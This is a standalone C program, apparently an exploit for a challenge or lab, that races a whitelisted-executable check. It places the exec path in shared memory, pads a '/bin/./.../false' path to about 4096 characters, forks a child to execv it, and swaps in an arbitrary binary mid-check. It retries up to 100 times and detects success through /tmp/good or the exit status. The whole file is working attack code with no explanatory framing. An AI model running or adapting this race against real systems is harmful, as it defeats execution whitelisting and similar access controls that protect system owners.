#define _GNU_SOURCE

#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define deb(stuff)

int main(int argc, char **argv) {
  char *file, *orig = argv[1], **exe_argv = argv + 1, *exec_path; 
  struct stat st;
  
  int npads, child, status, wait, tries;

  if (argc == 1) {
    printf("%s COMMAND...\n", argv[0]);
    return 1;
  }

  exec_path = realpath(argv[1], NULL);
  if (!exec_path) {
    perror("[!] Failed to find executable");
    return 1;
  }

  file = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | 
      MAP_SHARED, -1, 0);
  if (file == MAP_FAILED) {
    perror("[!] mmap()");
    return 1;
  }

  exe_argv[0] = file;

  if (symlink(exec_path, "/tmp/false") < 0) {
    perror("[!] symlink()");
    return 1;
  }

  // Fork and change it to some non-whitelist executable.
  for (tries = 0; tries < 100; tries++) {
    deb(printf("[+] Trial %d\n", tries + 1));

    // Generate long-ass filename (~4096 len)
    deb(puts("[+] Generating filename!"));
    strcpy(file, "/bin/");
    npads = (0x1000 - 12) / 2;
    while (npads --> 0)
      strcat(file, "./");
    strcat(file, "false");

    deb(puts("[+] Attempting race condition..."));
    child = fork();
    if (child < 0) {
      perror("[!] fork() failed");
      goto ERR_EXIT;
    } else if (!child) {
      deb(puts("[*] In child"));
      execv(exe_argv[0], exe_argv);
      perror("[!] execve() failed");
      goto ERR_EXIT;
    } else {
      deb(puts("[*] In parent"));
      wait = 10000;
      while (wait --> 0) 
        asm volatile ("pause");
      deb(puts("[*] In parent 2"));
      strncpy(file, orig, 0x1000);

      if (waitpid(child, &status, 0) < 0) {
        perror("[!] waitpid() failed");
        goto ERR_EXIT;
      }

      // If we get an override signal
      if (stat("/tmp/good", &st) >= 0) {
        deb(puts("[+] Okay we succeeded!"));
        if (unlink("/tmp/good") < 0)
          perror("[!] unlink(/tmp/good)");
        if (unlink("/tmp/false") < 0)
          perror("[!] unlink()");
        return 0;
      }

      if (WIFSIGNALED(status) && WTERMSIG(status) == SIGKILL) {
        deb(puts("[!] Too fast in changing file!"));
      } else if (WIFEXITED(status)) {
        if (WEXITSTATUS(status))
          deb(puts("[!] Too slow in changing file!"));
        else { 
          deb(puts("[+] Okay we succeeded!"));
          if (unlink("/tmp/false") < 0)
            perror("[!] unlink(/tmp/false)");
          return 0;
        }
      } else {
        puts("[!] Something unexpected happened!");
      }
    }
  }

  puts("[!] Failed!");
ERR_EXIT:
  if (unlink("/tmp/false") < 0)
    perror("[!] unlink()");
  return 1;
}
